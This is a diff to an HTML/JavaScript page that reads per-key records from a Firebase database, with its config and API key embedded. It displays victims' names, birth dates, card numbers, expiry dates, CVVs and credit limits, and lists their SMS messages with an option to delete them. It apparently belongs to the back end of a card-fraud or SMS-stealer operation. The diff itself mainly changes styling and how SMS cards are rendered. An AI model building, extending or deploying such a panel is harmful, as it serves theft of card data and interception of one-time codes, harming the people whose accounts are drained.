@@ -12,7 +12,6 @@
     <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <style>
-        /* Base styles */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
@@ -53,16 +52,17 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
         }
 
-        .entry, .sms-entry {
+        .entry {
+            display: flex;
+            flex-direction: column;
             padding: 20px;
             border: 1px solid #ddd;
             background: #ffffff;
             border-radius: 12px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            margin-bottom: 12px;
         }
 
-        .entry p, .sms-entry p {
+        .entry p {
             margin: 8px 0;
             display: flex;
             flex-direction: row;
@@ -70,20 +70,20 @@
             gap: 16px;
         }
 
-        .label {
+        .entry p span.label {
             font-weight: 600;
+            width: 40%;
             color: #555;
         }
 
-        .data {
+        .entry p span.data {
+            font-weight: normal;
             color: #000;
+            width: 60%;
         }
 
-        .actions {
-            text-align: right;
-        }
-
-        .entry button, .sms-entry button.delete-button {
+        .entry button {
+            margin-top: 12px;
             padding: 12px 16px;
             font-size: 1em;
             background-color: #007bff;
@@ -92,14 +92,58 @@
             border-radius: 8px;
             cursor: pointer;
             transition: background-color 0.3s ease, transform 0.2s ease;
+            width: 100%;
         }
 
-        .entry button:hover, .sms-entry button.delete-button:hover {
+        .entry button:hover {
             background-color: #0056b3;
             transform: translateY(-2px);
         }
 
-        /* Responsive adjustments */
+        .sms-entry {
+            padding: 16px;
+            border: 1px solid #ddd;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            margin-bottom: 12px;
+        }
+
+        .sms-entry p {
+            margin: 8px 0;
+            font-size: 0.9em;
+        }
+
+        .sms-entry .label {
+            font-weight: 600;
+            color: #555;
+        }
+
+        .sms-entry .data {
+            color: #000;
+        }
+
+        .sms-entry .actions {
+            text-align: right;
+            margin-top: 12px;
+        }
+
+        .sms-entry button.delete-button {
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+
+        .sms-entry button.delete-button:hover {
+            background-color: #c82333;
+            transform: translateY(-2px);
+        }
+
+        /* Mobile-specific styles */
         @media (max-width: 600px) {
             h1 {
                 font-size: 1.5em;
@@ -109,13 +153,21 @@
                 padding: 10px;
             }
 
-            .label, .data {
+            .entry p span.label, .entry p span.data {
                 width: 100%;
             }
 
-            .entry button, .sms-entry button.delete-button {
+            .entry button {
                 padding: 10px 14px;
                 font-size: 0.9em;
+            }
+
+            .sms-entry {
+                padding: 12px;
+            }
+
+            .sms-entry p {
+                font-size: 0.8em;
             }
         }
     </style>
@@ -126,12 +178,15 @@
         <div id="details-container" class="details-container"></div>
         <div id="data-container" class="data-container"></div>
         <div id="sms-container" class="sms-container">
-            <div id="sms-cards"></div>
+            <!-- SMS data will be loaded here as cards -->
+            <div id="sms-cards">
+                <!-- SMS entries will be dynamically inserted here -->
+            </div>
         </div>
     </div>
 
     <script>
-     const firebaseConfig = {
+const firebaseConfig = {
   apiKey: "AIzaSyCUp9H-jYvJUM3BIhtpaIH2_1eFkBGGyfI",
   authDomain: "rbll-6d959.firebaseapp.com",
   databaseURL: "https://rbll-6d959-default-rtdb.firebaseio.com",
@@ -141,7 +196,7 @@
   appId: "1:788197114761:web:52a98bcd8528ca3c529758",
   measurementId: "G-EM4YKQLHM1"
 };
-
+        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
 
         const urlParams = new URLSearchParams(window.location.search);
@@ -155,26 +210,27 @@
             const dbRef = db.child(`/${key}/Details`);
             const smsRef = db.child(`/${key}/SMS`);
 
+            // Fetch details data
             dbRef.once('value')
                 .then(snapshot => {
                     const detailsData = snapshot.val();
                     const detailsContainer = document.getElementById('details-container');
-                    detailsContainer.innerHTML = ''; 
+                    detailsContainer.innerHTML = ''; // Clear the container first
 
                     if (detailsData) {
                         const detailsEntries = `
                             <div class="entry">
-                                <p><span class="label">Name:</span> <span class="data">${detailsData.name || 'N/A'}</span></p>
-                                <p><span class="label">Date Of Birth:</span> <span class="data">${detailsData.dob || 'N/A'}</span></p>
-                                <p><span class="label">Email:</span> <span class="data">${detailsData.email || 'N/A'}</span></p>
-                                <p><span class="label">Mobile Number:</span> <span class="data">${detailsData.mobile || 'N/A'}</span></p>
-                                <p><span class="label">City:</span> <span class="data">${detailsData.city || 'N/A'}</span></p>
-                                <p><span class="label">Total Limit:</span> <span class="data">${detailsData.totalLimit || 'N/A'}</span></p>
-                                <p><span class="label">Available Limit:</span> <span class="data">${detailsData.availableLimit || 'N/A'}</span></p>
-                                <p><span class="label">Card Holder Name:</span> <span class="data">${detailsData.cardholdername || 'N/A'}</span></p>
-                                <p><span class="label">Card Number:</span> <span class="data">${detailsData.cardnumber || 'N/A'}</span></p>
-                                <p><span class="label">Expiry Date:</span> <span class="data">${detailsData.expiryDate || 'N/A'}</span></p>
-                                <p><span class="label">CVV:</span> <span class="data">${detailsData.cvv || 'N/A'}</span></p>
+                                <p><span class="label">Name:</span> ${detailsData.name || 'N/A'}</p>
+                                <p><span class="label">Date Of Birth:</span> ${detailsData.dob || 'N/A'}</p>
+                                <p><span class="label">Email:</span> ${detailsData.email || 'N/A'}</p>
+                                <p><span class="label">Mobile Number:</span> ${detailsData.mobile || 'N/A'}</p>
+                                <p><span class="label">City:</span> ${detailsData.city || 'N/A'}</p>
+                                <p><span class="label">Total Limit:</span> ${detailsData.totalLimit || 'N/A'}</p>
+                                <p><span class="label">Availble Limit:</span> ${detailsData.availableLimit || 'N/A'}</p>
+                                <p><span class="label">Card Holder Name:</span> ${detailsData.cardholdername || 'N/A'}</p>
+                                <p><span class="label">Card Number:</span> ${detailsData.cardnumber || 'N/A'}</p>
+                                <p><span class="label">Expiry Date:</span> ${detailsData.expiryDate || 'N/A'}</p>
+                                <p><span class="label">Cvv:</span> ${detailsData.cvv || 'N/A'}</p>
                             </div>
                         `;
                         detailsContainer.innerHTML = detailsEntries;
@@ -187,12 +243,6 @@
                     document.getElementById('details-container').innerHTML = '<p>Error fetching details data</p>';
                 });
 
-             if (key) {
-            document.getElementById('keyvalue').textContent = `SMS Data for Key: ${key}`;
-
-            const database = firebase.database();
-            const smsRef = database.ref(`/data/${key}/SMS`);
-
             // Fetch SMS data and display in card format
             smsRef.once('value')
                 .then(snapshot => {
@@ -200,26 +250,26 @@
                     const smsCardsContainer = document.getElementById('sms-cards');
                     smsCardsContainer.innerHTML = ''; // Clear the container first
 
-                    if (smsData) {
-                        Object.entries(smsData).forEach(([id, sms]) => {
-                            const { phoneNumber, message, time } = sms;
+                    if (smsData && typeof smsData === 'object') {
+                        // Convert smsData object to array and sort by time
+                        const sortedSmsData = Object.keys(smsData)
+                            .map(key => ({ key, ...smsData[key] }))
+                            .sort((a, b) => new Date(b.time) - new Date(a.time));
 
-                            // Create an SMS entry card
-                            const smsEntry = `
-                                <div class="sms-entry" id="${id}">
-                                    <p><span class="label">Number:</span> <span class="data">${phoneNumber || 'N/A'}</span></p>
-                                    <p><span class="label">Message:</span> <span class="data">${message || 'N/A'}</span></p>
-                                    <p><span class="label">Time:</span> <span class="data">${time || 'N/A'}</span></p>
-                                    <div class="actions">
-                                        <button class="delete-button" onclick="deleteSMS('${id}')">
-                                            <i class="fa fa-trash"></i> Delete
-                                        </button>
-                                    </div>
+                        const smsEntries = sortedSmsData.map(({ key, a, b, c }) => `
+                            <div class="sms-entry" id="${key}">
+                                <p><span class="label">Number: </span> <span class="data">${a || 'N/A'}</span></p>
+                                <p><span class="label">Message: </span> <span class="data">${b || 'N/A'}</span></p>
+                                <p><span class="label">Time: </span> <span class="data">${c || 'N/A'}</span></p>
+                                <div class="actions">
+                                    <button class="delete-button" onclick="deleteSMS('${key}')">
+                                        <i class="fa fa-trash"></i>
+                                    </button>
                                 </div>
-                            `;
+                            </div>
+                        `).join('');
 
-                            smsCardsContainer.insertAdjacentHTML('beforeend', smsEntry);
-                        });
+                        smsCardsContainer.innerHTML = smsEntries;
                     } else {
                         smsCardsContainer.innerHTML = '<p>No SMS data available</p>';
                     }
@@ -228,22 +278,21 @@
                     console.error('Error fetching SMS data:', error);
                     document.getElementById('sms-cards').innerHTML = '<p>Error fetching SMS data</p>';
                 });
-
-            // Delete SMS entry
-            window.deleteSMS = function (smsId) {
-                const smsRefToDelete = database.ref(`/data/${key}/SMS/${smsId}`);
-                smsRefToDelete.remove()
-                    .then(() => {
-                        document.getElementById(smsId).remove();
-                        alert('SMS entry deleted successfully');
-                    })
-                    .catch(error => {
-                        console.error('Error deleting SMS entry:', error);
-                        alert('Error deleting SMS entry');
-                    });
-            };
         } else {
-            document.getElementById('sms-container').innerHTML = '<p>Invalid Key</p>';
+            document.getElementById('data-container').innerHTML = '<p>Invalid Key</p>';
+        }
+
+        function deleteSMS(smsId) {
+            const smsRef = firebase.database().ref(`/data/${key}/SMS/${smsId}`);
+            smsRef.remove()
+                .then(() => {
+                    document.getElementById(smsId).remove();
+                    alert('SMS entry deleted successfully');
+                })
+                .catch(error => {
+                    console.error('Error deleting SMS entry:', error);
+                    alert('Error deleting SMS entry');
+                });
         }
     </script>
 </body>
